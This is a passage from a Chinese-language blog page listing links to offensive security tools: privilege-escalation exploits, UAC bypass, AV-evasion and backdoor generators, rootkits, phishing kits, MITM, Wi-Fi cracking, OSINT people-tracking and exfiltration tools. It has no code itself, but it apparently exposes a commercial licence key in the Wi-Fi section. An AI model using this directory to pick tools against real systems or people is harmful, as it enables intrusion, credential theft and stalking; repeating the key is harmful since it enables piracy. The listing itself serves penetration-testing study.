class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/AlessandroZ/BeRoot py,通过检查常见的错误配置来查找提权方法. 支持Windows/Linux/Mac</span><br><span class="line">https://github.com/mschwager/0wned 利用python包进行高权限用户创建</span><br><span class="line">https://github.com/mzet-/linux-exploit-suggester 查找linux有哪些补丁没有打的脚本</span><br><span class="line">https://github.com/belane/linux-soft-exploit-suggester 查找linux有哪些有漏洞的软件</span><br><span class="line">https://github.com/dirtycow/dirtycow.github.io 脏牛提权漏洞exp</span><br><span class="line">https://github.com/FireFart/dirtycow 脏牛提权漏洞exp</span><br><span class="line">https://github.com/stanleyb0y/sushell 利用su小偷实现低权限用户窃取root用户口令</span><br><span class="line">https://github.com/jas502n/CVE-2018-17182/ Linux 内核VMA-UAF 提权漏洞 CVE-2018-17182</span><br><span class="line">https://github.com/jas502n/CVE-2018-14665 CVE-2018-14665，linux下Xorg X服务器提权利用</span><br><span class="line">https://github.com/nmulasmajic/syscall_exploit_CVE-2018-8897 Linux系统利用Syscall实现提权</span><br><span class="line">https://github.com/can1357/CVE-2018-8897 Linux系统利用Syscall实现提权</span><br><span class="line">https://github.com/SecWiki/linux-kernel-exploits linux-kernel-exploits Linux平台提权漏洞集合</span><br><span class="line">https://github.com/nilotpalbiswas/Auto-Root-Exploit linux自动提权脚本</span><br><span class="line">https://github.com/WazeHell/PE-Linux Linux提权工具</span><br><span class="line">https://guif.re/linuxeop linux提权命令集合</span><br></pre></td></tr></table></figure><h2 id="Windows提权相关"><a href="#Windows提权相关" class="headerlink" title="Windows提权相关"></a><strong>Windows提权相关</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">http://www.fuzzysecurity.com/tutorials/16.html windows平台教程级提权参考文章</span><br><span class="line">https://github.com/SecWiki/windows-kernel-exploits Windows平台提权漏洞Exp集合</span><br><span class="line">https://github.com/51x/WHP windows下各种提权与利用工具</span><br><span class="line">https://github.com/rasta-mouse/Sherlock win提权漏洞验证</span><br><span class="line">https://github.com/WindowsExploits/Exploits 微软CVE-2012-0217、CVE-2016-3309、CVE-2016-3371、CVE-2016-7255、CVE-2017-0213提权利用</span><br><span class="line">https://github.com/decoder-it/lonelypotato RottenPotatoNG变种，利用NBNS本地域名欺骗和WPAD代理欺骗提权</span><br><span class="line">https://github.com/ohpe/juicy-potato RottenPotatoNG变种，利用com对象、用户token进行提权</span><br><span class="line">https://github.com/foxglovesec/Potato RottenPotatoNG变种，利用本地域名欺骗和代理欺骗提权</span><br><span class="line">https://github.com/DanMcInerney/icebreaker 处于内网环境但又在AD环境之外，icebreaker将会帮助你获取明文Active Directory凭据（活动目录存储在域控服务器可用于提权）</span><br><span class="line">https://github.com/hausec/ADAPE-Script Active Directory权限提升脚本</span><br><span class="line">https://github.com/klionsec/BypassAV-AllThings 利用aspx一句话配合提权payload提权</span><br><span class="line">https://github.com/St0rn/Windows-10-Exploit msf插件，win10 uac bypass</span><br><span class="line">https://github.com/sam-b/CVE-2014-4113 利用Win32k.sys内核漏洞进行提取，ms14-058</span><br><span class="line">https://github.com/breenmachine/RottenPotatoNG 利用NBNS本地域名欺骗和WPAD代理欺骗提权</span><br><span class="line">https://github.com/unamer/CVE-2018-8120 影响Win32k组件，针对win7和win2008提权</span><br><span class="line">https://github.com/alpha1ab/CVE-2018-8120 在win7与win2k8的基础上增加了winXP与win2k3</span><br><span class="line">https://github.com/0xbadjuju/Tokenvator 使用Windows令牌提升权限的工具，提供一个交互命令行界面</span><br></pre></td></tr></table></figure><h2 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a><strong>权限绕过</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">https://payloads.online/archivers/2018-12-22/1 DLL Hijacking &amp; COM Hijacking ByPass UAC - 议题解读</span><br><span class="line">https://github.com/tyranid/DotNetToJScript 能够利用JS/Vbs脚本加载.Net程序的工具</span><br><span class="line">https://github.com/mdsecactivebreach/SharpPack 绕过系统应用白名单执行DotNet and PowerShell tools</span><br><span class="line">https://github.com/rootm0s/WinPwnage py2，win下权限提升，uac绕过，dll注入等</span><br><span class="line">https://github.com/hfiref0x/UACME 包含许多用于多个版本操作系统上绕过Windows用户帐户控制的方法</span><br><span class="line">https://github.com/Ben0xA/nps 实现了不使用powershell.exe的情况下执行powershell命令</span><br><span class="line">https://github.com/Mr-Un1k0d3r/PowerLessShell 实现了不调用powershell.exe的情况下执行powershell命令</span><br><span class="line">https://github.com/p3nt4/PowerShdll 使用rundll32运行PowerShell，绕过软件限制</span><br><span class="line">https://github.com/ionescu007/r0ak 内核层的瑞士军刀. 在Windows10内核中读/写/执行代码</span><br><span class="line">https://github.com/leechristensen/UnmanagedPowerShell 从一个非托管程序来执行PowerShell,经过一些修改后可以被用来注入到其他进程</span><br><span class="line">https://github.com/stephenfewer/ReflectiveDLLInjection 一种库注入技术，让DLL自身不使用LoadLibraryA函数,将自身映射到目标进程内存中</span><br><span class="line">https://github.com/ChrisAD/ads-payload 利用环境变量与destop.ini绕过windows下的Palo Alto Traps endpoint 防护软件</span><br><span class="line">https://github.com/Zer0Mem0ry/RunPE 通过内存读取，网络传输内容，利用PE执行shellcode</span><br></pre></td></tr></table></figure><h2 id="沙盒逃逸"><a href="#沙盒逃逸" class="headerlink" title="沙盒逃逸"></a><strong>沙盒逃逸</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/hacksysteam/WpadEscape 利用wpad进行浏览器 sandbox沙箱逃逸</span><br><span class="line">https://github.com/unamer/vmware_escape vmware虚拟机逃逸。CVE-2017-4901，CVE-2018-6981，CVE-2018-6982</span><br><span class="line">https://github.com/MorteNoir1/virtualbox_e1000_0day VirtualBox E1000 Guest-to-Host Escape逃逸。教程</span><br><span class="line">https://bugs.chromium.org/p/project-zero/issues/detail?id=1682&amp;desc=2 Ghostscript：基于漏洞CVE-2018-17961的-dSAFER沙盒逃逸技术</span><br></pre></td></tr></table></figure><h2 id="后门免杀代码混淆"><a href="#后门免杀代码混淆" class="headerlink" title="后门免杀代码混淆"></a><strong>后门免杀代码混淆</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">https://www.shellterproject.com 杀毒软件绕过</span><br><span class="line">https://github.com/trustedsec/unicorn py，一键生成多种后门</span><br><span class="line">https://github.com/islamTaha12/Python-Rootkit windows下rootkit，反弹meterpreter</span><br><span class="line">https://github.com/n00py/Hwacha linux下快速生成metepreter等多种payload</span><br><span class="line">https://github.com/Screetsec/Vegile msf免杀，程序注入</span><br><span class="line">https://github.com/MohamedNourTN/Terminator py2，msf免杀</span><br><span class="line">https://github.com/Veil-Framework/Veil msf免杀</span><br><span class="line">https://github.com/abedalqaderswedan1/aswcrypter py、bash，msf免杀</span><br><span class="line">https://github.com/Screetsec/TheFatRat java，msf免杀，利用searchsploit快速搜索</span><br><span class="line">https://github.com/pasahitz/zirikatu msf免杀</span><br><span class="line">https://github.com/govolution/avet msf免杀</span><br><span class="line">https://github.com/GreatSCT/GreatSCT msf免杀</span><br><span class="line">https://github.com/EgeBalci/HERCULES msf免杀</span><br><span class="line">https://github.com/trustedsec/nps_payload msf免杀</span><br><span class="line">https://github.com/4w4k3/Insanity-Framework py，payload生成，过杀软，识别虚拟机，钓鱼，内存注入等</span><br><span class="line">https://github.com/hlldz/SpookFlare Meterpreter，Empire，Koadic等loader/dropper的生成器，可以绕过客户端检测和网络端检测的端点策略</span><br><span class="line">https://github.com/pasahitz/regsvr32 使用C#+Empire实现最小体积免杀后门</span><br><span class="line">https://github.com/malcomvetter/UnstoppableService 将自身安装为Windows服务且管理员无法停止/暂停服务的程序. C#编写</span><br><span class="line">https://github.com/Cn33liz/StarFighters 基于DotNetToJScript，利用JavaScript和VBScript执行Empire Launcher</span><br><span class="line">https://github.com/mdsecactivebreach/SharpShooter 基于DotNetToJScript使用js、vbs，用于检索和执行任意CSharp源码的payload创建框架</span><br><span class="line">https://github.com/mdsecactivebreach/CACTUSTORCH 基于DotNetToJScript使用js、vbs生成恶意payload</span><br><span class="line">https://github.com/OmerYa/Invisi-Shell 对powershell文件进行混淆</span><br><span class="line">https://github.com/danielbohannon/Invoke-DOSfuscation 对powershell文件进行混淆，加密操作以及重新编码</span><br><span class="line">https://github.com/danielbohannon/Invoke-Obfuscation 对powershell文件进行混淆，加密操作以及重新编码</span><br><span class="line">https://github.com/Mr-Un1k0d3r/SCT-obfuscator Cobalt Strike SCT有效载荷混淆器</span><br><span class="line">https://github.com/tokyoneon/Armor bash，生成加密 Payload 在 macOS 上反弹 Shell</span><br><span class="line">https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator 宏混淆，其中还包括AV/Sandboxes逃避机制</span><br><span class="line">https://github.com/Kkevsterrr/backdoorme py3、py2多种类型的后门、shell生成工具，可以自动维持权限</span><br><span class="line">https://github.com/TestingPens/MalwarePersistenceScripts win下权限维持脚本</span><br><span class="line">https://github.com/mhaskar/Linux-Root-Kit py，simple，linux下rootkit</span><br><span class="line">https://github.com/PinkP4nther/Sutekh simple，rootkit，使普通用户获取root shell</span><br><span class="line">https://github.com/threatexpress/metatwin 从一个文件中提取元数据，包括数字签名，并注入到另一个文件中</span><br><span class="line">https://github.com/Mr-Un1k0d3r/Windows-SignedBinary 可以修改二进制文件的HASH，同时保留微软windows的签名</span><br><span class="line">https://github.com/secretsquirrel/SigThief py，用于劫持合法的数字签名并绕过Windows的哈希验证机制的脚本工具</span><br><span class="line">https://github.com/9aylas/Shortcut-Payload-Generator 快捷方式(.lnk)文件Payload生成器.AutoIt编写</span><br><span class="line">https://github.com/GuestGuri/Rootkit 反弹一个tcp连接，将进程id绑定到一个空文件夹</span><br><span class="line">https://github.com/secretsquirrel/the-backdoor-factory 可以生成win32PE后门测试程序,ELF文件后门程序等</span><br></pre></td></tr></table></figure><h2 id="文件捆绑"><a href="#文件捆绑" class="headerlink" title="文件捆绑"></a><strong>文件捆绑</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">bat2exe.net 相类似也可以利用iexpress与winrar生成自解压exe可执行文件</span><br><span class="line">https://github.com/islamadel/bat2exe 将bat文件转换为exe二进制文件</span><br><span class="line">https://github.com/tywali/Bat2ExeConverter 将bat文件转换为exe二进制文件</span><br><span class="line">https://github.com/Juntalis/win32-bat2exe 将bat文件转换为exe二进制文件</span><br><span class="line">http://www.f2ko.de/downloads/Bat_To_Exe_Converter.zip 将bat文件转换为exe二进制文件，可以隐藏窗口。</span><br><span class="line">https://github.com/r00t-3xp10it/trojanizer 将两个可执行文件打包为自解压文件，自解压文件在执行时会执行可执行文件</span><br><span class="line">https://github.com/r00t-3xp10it/backdoorppt 将payload更换图标</span><br><span class="line">https://github.com/r00t-3xp10it/FakeImageExploiter 将payload更换图标。需要wine与resourcehacker环境</span><br><span class="line">https://github.com/DamonMohammadbagher/FakeFileMaker 更换图标和名称</span><br><span class="line">https://github.com/peewpw/Invoke-PSImage 将PS脚本隐藏进PNG像素中并用一行指令去执行它</span><br><span class="line">https://github.com/Mr-Un1k0d3r/DKMC Don’t kill my cat生成混淆的shellcode，将shellcode存储在多语言图像中</span><br><span class="line">https://github.com/deepzec/Bad-Pdf 生成一个pdf文件，内含payload来窃取win上的Net-NTLM哈希</span><br><span class="line">https://github.com/3gstudent/Worse-PDF 向PDF文件中插入恶意代码，来窃取win上的Net-NTLM哈希</span><br></pre></td></tr></table></figure><h2 id="社工相关"><a href="#社工相关" class="headerlink" title="社工相关"></a><strong>社工相关</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/brannondorsey/PassGAN py,深度学习,密码字典样本生成</span><br><span class="line">https://github.com/Mebus/cupp 根据用户习惯密码生成弱口令探测</span><br><span class="line">https://github.com/Saferman/cupper 根据用户习惯密码生成弱口令探测，楼上升级</span><br><span class="line">https://github.com/LandGrey/pydictor py3，特定密码字典生成</span><br><span class="line">https://github.com/mehulj94/Radium-Keylogger python下的键盘记录工具</span><br><span class="line">https://github.com/threatexpress/domainhunter 检查过期域名，bluecoat分类和Archive.org历史记录，以确定最为适合于钓鱼和C2的域名</span><br><span class="line">https://github.com/Mr-Un1k0d3r/CatMyPhish 收集目标类似的尚未注册的域名</span><br><span class="line">https://github.com/x0day/Multisearch-v2 Bing、google、360、zoomeye等搜索引擎聚合搜索，可用于发现企业被搜索引擎收录的敏感资产信息</span><br><span class="line">https://github.com/n0tr00t/Sreg Sreg可对使用者通过输入email、phone、username的返回用户注册的所有互联网护照信息。</span><br><span class="line">https://github.com/SpiderLabs/social_mapper 社交媒体枚举和关联工具, 通过人脸识别关联人物侧写</span><br><span class="line">https://github.com/vysec/MaiInt 公司雇员信息收集测试工具</span><br><span class="line">https://github.com/jofpin/trape py，利用OSINT对人员进行追踪定位</span><br><span class="line">https://github.com/famavott/osint-scraper 输入人名或邮箱地址, 自动从互联网爬取关于此人的信息</span><br><span class="line">https://github.com/xHak9x/fbi py2,facebook脸书信息搜集工具</span><br><span class="line">https://github.com/initstring/linkedin2username 通过Linkedin 领英获取相关公司员工列表</span><br><span class="line">https://github.com/0x09AL/raven linux下领英Linkedin information gathering tool</span><br><span class="line">https://github.com/Ridter/Mailget 通过脉脉用户猜测企业邮箱</span><br><span class="line">https://github.com/haccer/tweep 使用twitter API进行信息爬取查询</span><br><span class="line">https://github.com/MazenElzanaty/TwLocation py，获取Twitter用户发推的地址</span><br><span class="line">https://github.com/vaguileradiaz/tinfoleak web界面，对某人的twitter进行全面的情报分析</span><br><span class="line">https://github.com/deepfakes 虚假音视频制作</span><br><span class="line">https://www.jianshu.com/p/147cf5414851 聊聊那些常见的探侦类APP</span><br><span class="line">https://github.com/thinkst/canarytokens 重要文件的追踪溯源，信标定位（https://canarytokens.org/generate#）</span><br><span class="line">https://github.com/ggerganov/kbd-audio c++,linux,利用麦克风监控键盘输入测试输入值</span><br></pre></td></tr></table></figure><h2 id="网站克隆镜像伪造"><a href="#网站克隆镜像伪造" class="headerlink" title="网站克隆镜像伪造"></a><strong>网站克隆镜像伪造</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.httrack.com 网站克隆镜像</span><br></pre></td></tr></table></figure><h2 id="钓鱼框架邮件伪造"><a href="#钓鱼框架邮件伪造" class="headerlink" title="钓鱼框架邮件伪造"></a><strong>钓鱼框架邮件伪造</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/bhdresh/SocialEngineeringPayloads 负责收集用于证书盗窃和鱼叉式网络钓鱼攻击的社交工程技巧和payloads</span><br><span class="line">https://github.com/trustedsec/social-engineer-toolkit 专为社交工程设计的开源渗透测试框架</span><br><span class="line">https://github.com/thelinuxchoice/blackeye 拥有facebook、instagram等三十余个钓鱼模板的一键启用工具</span><br><span class="line">https://github.com/M4cs/BlackEye-Python 以blackeye为基础加强子域的管理</span><br><span class="line">https://github.com/azizaltuntas/Camelishing py3，界面化社会工程学攻击辅助工具</span><br><span class="line">https://github.com/JonCooperWorks/judas go，克隆网站钓鱼</span><br><span class="line">https://github.com/gophish/gophish go，拥有在线模板设计、发送诱骗广告等功能的钓鱼系统</span><br><span class="line">https://github.com/tatanus/SPF py2，deefcon上的钓鱼系统</span><br><span class="line">https://github.com/MSG-maniac/mail_fishing 甲方内部钓鱼系统</span><br><span class="line">https://github.com/samyoyo/weeman 钓鱼的http服务器</span><br><span class="line">https://github.com/Raikia/FiercePhish 可以管理所有钓鱼攻击的完整钓鱼框架，允许你跟踪单独的网络钓鱼活动，定时发送电子邮件等</span><br><span class="line">https://github.com/securestate/king-phisher 可视化钓鱼活动工具包</span><br><span class="line">https://github.com/fireeye/ReelPhish 实时双因素网络钓鱼工具</span><br><span class="line">https://github.com/kgretzky/evilginx 绕过双因素验证的钓鱼框架</span><br><span class="line">https://github.com/kgretzky/evilginx2 MiTM 框架, 登录页面钓鱼, 绕过双因素认证等</span><br><span class="line">https://github.com/ustayready/CredSniper 使用Flask和Jinja2模板编写的网络钓鱼框架，支持捕获2FA令牌</span><br><span class="line">https://github.com/fireeye/PwnAuth OAuth滥用测试检测平台</span><br><span class="line">https://github.com/n0pe-sled/Postfix-Server-Setup 自动化建立一个网络钓鱼服务器</span><br><span class="line">https://github.com/Dionach/PhEmail py2，钓鱼与邮件伪造</span><br><span class="line">https://github.com/PHPMailer/PHPMailer 世界上最流行的PHP发送邮件的代码</span><br><span class="line">http://tool.chacuo.net/mailanonymous 在线邮件伪造</span><br><span class="line">http://ns4gov.000webhostapp.com 在线邮件伪造</span><br></pre></td></tr></table></figure><h2 id="中间人攻击流量劫持"><a href="#中间人攻击流量劫持" class="headerlink" title="中间人攻击流量劫持"></a><strong>中间人攻击流量劫持</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/bettercap/bettercap 网络攻击以及监控的瑞士军刀。该工具支持多种模块，比如ARP/DNS欺骗、TCP以及数据包代理等</span><br><span class="line">https://github.com/mitmproxy/mitmproxy PY,支持SSL拦截，进行https流量代理</span><br><span class="line">https://github.com/qiyeboy/BaseProxy py3,异步http/https代理,楼上简化版。可以作为中间人工具，比如说替换网址图片等</span><br><span class="line">https://github.com/lgandx/Responder 用于嗅探网络内所有的NTLM、NTLMv1/v2、Net-NTLMv1/v2包，对网络内主机进行欺骗获取用户hash。a拿着b密码请求b，c对a说我是b，然后c获得了b的密码，https://www.secpulse.com/archives/65503.html 【脉搏译文系列】渗透师指南之Responder。</span><br><span class="line">https://github.com/Kevin-Robertson/Inveigh 一款PowerShell LLMNR / mDNS / NBNS欺骗器和中间人工具</span><br><span class="line">https://github.com/LionSec/xerosploit 中间人攻击测试工具包</span><br><span class="line">https://github.com/AlsidOfficial/WSUSpendu 可以自主创建恶意更新，并将其注入到WSUS服务器数据库中，然后随意的分发这些恶意更新</span><br><span class="line">https://github.com/infobyte/evilgrade 一个模块化的脚本框架，使攻击者在不知情的情况下将恶意更新注入到用户更新中</span><br><span class="line">https://github.com/quickbreach/smbetray 专注于通过文件内容交换、lnk交换来攻击客户端，以及窃取任何以明文形式传输的数据</span><br><span class="line">https://github.com/mrexodia/haxxmap 对IMAP服务器进行中间人攻击</span><br></pre></td></tr></table></figure><h2 id="协议解析流量还原分析"><a href="#协议解析流量还原分析" class="headerlink" title="协议解析流量还原分析"></a><strong>协议解析流量还原分析</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/wireshark/wireshark 协议解析流量分析还原</span><br><span class="line">https://github.com/CoreSecurity/impacket Impacket是用于处理网络协议的Python工具包集合，内网中可用以提权例如wmiexec.py、NMB，SMB1-3和MS-DCERPC提供对协议实现本身的低级别编程访问。</span><br><span class="line">https://github.com/secdev/scapy 内置了交互式网络数据包处理、数据包生成器、网络扫描器网络发现和包嗅探工具，提供多种协议包生成及解析插件，能够灵活的的生成协议数据包，并进行修改、解析。</span><br><span class="line">https://gitee.com/qielige/openQPA 协议分析软件QPA的开源代码，特点是进程抓包、特征自动分析</span><br><span class="line">https://github.com/jtpereyda/boofuzz 网络协议fuzz测试</span><br><span class="line">https://www.jianshu.com/p/4dca12a35158 5个常用的免费报文库</span><br><span class="line">https://github.com/zerbea/hcxdumptool 从Wlan设备上捕获数据包</span><br><span class="line">https://github.com/NytroRST/NetRipper 支持截获像putty,winscp,mssql,chrome,firefox,outlook，https中的明文密码</span><br><span class="line">https://github.com/shramos/polymorph 支持几乎所有现有协议的实时网络数据包操作框架</span><br><span class="line">https://github.com/nospaceships/raw-socket-sniffer C,PS，无需驱动抓取Windows流量</span><br></pre></td></tr></table></figure><h2 id="无线网络WIFI中间人攻击"><a href="#无线网络WIFI中间人攻击" class="headerlink" title="无线网络WIFI中间人攻击"></a><strong>无线网络WIFI中间人攻击</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/wi-fi-analyzer/fluxion 窃取用户wifi密码的进行密码重放攻击</span><br><span class="line">https://github.com/0v3rl0w/e013 窃取Wifi密码. VB脚本</span><br><span class="line">https://github.com/cls1991/ng 获取你当前连接wifi的密码与ip</span><br><span class="line">https://github.com/wifiphisher/wifiphisher PY,中间人攻击，FakeAp恶意热点，WIFI钓鱼，凭证窃取</span><br><span class="line">https://github.com/1N3/PRISM-AP 自动部署RogueAP(恶意热点) MITM攻击框架</span><br><span class="line">https://github.com/sensepost/mana Wifi劫持工具，可以监听计算机或其他移动设备的Wifi通信，并能够模仿该设备</span><br><span class="line">https://github.com/deltaxflux/fluxion bash与py，对使用wpa协议的无线网络进行MiTM攻击</span><br><span class="line">https://github.com/DanMcInerney/LANs.py ARP欺骗，无线网络劫持</span><br></pre></td></tr></table></figure><h2 id="无线网络WIFI防御"><a href="#无线网络WIFI防御" class="headerlink" title="无线网络WIFI防御"></a><strong>无线网络WIFI防御</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/SYWorks/waidps PY,Linux下无线网络入侵检测工具</span><br><span class="line">https://github.com/SkypLabs/probequest 嗅探和显示无线网卡附近的Wifi Probe请求</span><br><span class="line">https://github.com/wangshub/hmpa-pi 在树莓派或路由，利用 Wireshark 扫描附近网络 WiFi 设备，当有手机或其它 Wi-Fi 设备在附近时，通过邮件或者微信提醒</span><br><span class="line">https://github.com/besimaltnok/PiFinger 检查wifi是否为&quot;Wifi-Pineapple大菠萝&quot;所开放的恶意热点</span><br><span class="line">https://github.com/WiPi-Hunter/PiSavar 利用PineAP，对于FAKE AP虚假接入点，如&quot;Wifi-Pineapple大菠萝&quot;进行监测</span><br></pre></td></tr></table></figure><h2 id="无线网络WIFI审计测试"><a href="#无线网络WIFI审计测试" class="headerlink" title="无线网络WIFI审计测试"></a><strong>无线网络WIFI审计测试</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">https://www.wifislax.com 西班牙wifi审计系统，国内汉化版为无线革新5.1.1 Wifislax-WRC</span><br><span class="line">https://cn.elcomsoft.com/ewsa.html ewsa，wifi嗅探，握手包密码还原，EWSA-173-HC1UW-L3EGT-FFJ3O-SOQB3</span><br><span class="line">https://www.passcape.com wifipr，握手包密码还原，另外还有许多商业版windows下密码还原工具</span><br><span class="line">https://github.com/MisterBianco/BoopSuite 无线网络审计工具，支持2-5GHZ频段</span><br><span class="line">https://github.com/aircrack-ng/aircrack-ng 由数据包嗅探器、检测器、WPA / WPA2-PSK 解密器、WEP 和用于 802.11 无线局域网的分析工具组成</span><br><span class="line">https://github.com/t6x/reaver-wps-fork-t6x wps跑pin码攻击，常见wifi攻击</span><br><span class="line">https://github.com/derv82/wifite2 wifite无线审计工具升级版，联动aircrack-ng与reaver</span><br><span class="line">https://github.com/savio-code/fern-wifi-cracker 无线安全审计工具</span><br><span class="line">https://github.com/P0cL4bs/WiFi-Pumpkin 无线安全渗透测试套件</span><br><span class="line">https://github.com/entropy1337/infernal-twin 自动化无线攻击工具Infernal-Wireless</span><br><span class="line">https://github.com/m4n3dw0lf/PytheM Python网络/渗透测试工具</span><br><span class="line">https://github.com/InfamousSYN/rogue 无线网络攻击工具包</span><br><span class="line">https://github.com/cSploit/android 手机WiFi渗透工具框架，可以使用msf</span><br><span class="line">https://github.com/chrisk44/Hijacker 手机wifi测试工具</span><br><span class="line">https://andrax-pentest.org/ kali hunter手机渗透测试系统</span><br><span class="line">https://www.zimperium.com/zanti-mobile-penetration-testing 手机wifi渗透工具</span><br></pre></td></tr></table></figure><h2 id="数据取回隐秘传输"><a href="#数据取回隐秘传输" class="headerlink" title="数据取回隐秘传输"></a><strong>数据取回隐秘传输</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/TryCatchHCF/Cloakify 躲避DLP/MLS数据泄露防护系统，突破数据白名单控制，躲避AV检测进行数据盗取</span><br><span class="line">https://github.com/sensepost/DET 使用单个或多个通道同时执行数据取回</span><br><span class="line">https://github.com/Arno0x/DNSExfiltrator 利用DNS解析进行数据隐秘传输的工具</span><br><span class="line">https://github.com/ytisf/PyExfil 用于数据取回的Python软件包</span><br><span class="line">https://github.com/Arno0x/ReflectiveDnsExfiltrator反射DNS解析隐蔽通道进行数据泄露</span><br></pre></td></tr></table></figure><h2 id="硬件安全"><a href="#硬件安全" class="headerlink" title="硬件安全"></a><strong>硬件安全</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/unprovable/PentestHardware 硬件渗透测试实用手册</span><br><span class="line">https://ducktoolkit.com/ 橡皮鸭、HID键盘模拟器</span><br><span class="line">https://github.com/insecurityofthings/jackit 用于Mousejack的开发代码</span><br><span class="line">https://github.com/samyk/magspoof 